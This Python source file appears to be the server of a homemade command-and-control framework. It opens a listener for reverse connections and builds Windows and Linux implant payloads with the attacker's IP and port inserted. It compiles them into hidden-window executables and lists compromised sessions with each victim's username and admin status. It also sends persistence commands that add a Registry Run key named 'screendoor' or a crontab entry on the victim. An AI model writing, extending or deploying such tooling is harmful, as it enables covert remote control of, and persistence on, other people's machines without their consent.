import os
import shutil
import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime
import random
import string
import subprocess




def winplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()


def linplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}/linplant.py'):
        print(f'{check_cwd}')
        shutil.copy('linplant.py', file_name)
    else:
        print(f'[-] {check_cwd} \\ linplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

def exeplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    exe_file = f'{random_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occured during generation')
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    os.remove(f'{random_name}.spec')
    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(f'[+] {exe_file} saved to current directory.')
    else:
        print('[-] Some error occured during generation.')

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    #communication_handler()
    print('Prethread')
    t1 = threading.Thread(target=communication_handler)
    print('Starting thread')
    t1.start()

def target_comm_channel(target_id, targets, num):
    while True:
        message = input('send message#> ')
        communication_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            targets[num][7] = 'Dead'
            break
        elif message == 'background':
            break
        elif message == 'help':
            pass
        elif message == 'persist':
            payload_name = input('[+] Enter the name of the payload to add to autorun: ')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                target_id.send(persist_command_1.encode())
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                target_id.send(persist_command_2.encode())
                print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
            elif targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                target_id.send(persist_command.encode())
                print('[+] Run this command to clean up the crontab: \n crontab -r')
        else:
            response = communication_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                target_id.close()
                break

            print(response)

def communication_handler():
    while True:
        print('shhhhh')
        if kill_flag == 1:
            quit()
        try:
            remote_target, remote_ip = sock.accept()
            #remote_target.setblocking(False)
            print('socket accepted')
            username = remote_target.recv(1024).decode()
            print(username)
            admin = remote_target.recv(1024).decode()
            print(admin)
            op_sys = remote_target.recv(1024).decode()

            print(op_sys)
            if admin == 1:
                admin_value = 'Yes'
            elif username == 'root':
                admin_value = 'Yes'
            else:
                print('no')
                admin_value = 'No'
            print('post-admin')
            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            current_time = time.strftime("%H:%M:%S", time.localtime())
            print(current_time)
            date = datetime.now()
            print(date)
            time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            print(host_name)
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_value, op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass


def communication_in(target_id):
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response


def communication_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())


def banner():
    print('                                                                                                                                                           _..._                   ')
    print('                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
    print('             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
    print('           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
    print('          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
    print('           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
    print('       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
    print('     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
    print('    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
    print('  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
    print('.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
    print('.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
    print('           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')


if __name__ == '__main__':
    banner()
    targets = []
    listener_counter = 0
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    while True:
        try:
            command = input('Enter command#> ')
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP address to listen on: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        target_id = (targets[num])[0]
                        if (targets[num][7]) == 'Active':
                            target_comm_channel(target_id, targets, num)
                        else:
                            print('[-] You cannot interact with a dead session.')
                    except IndexError:
                        print(f'[-] Session {num} does not exist')
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
            if quit_message == 'y':
                targets_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        communication_out(target[0], 'exit')
                    communication_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue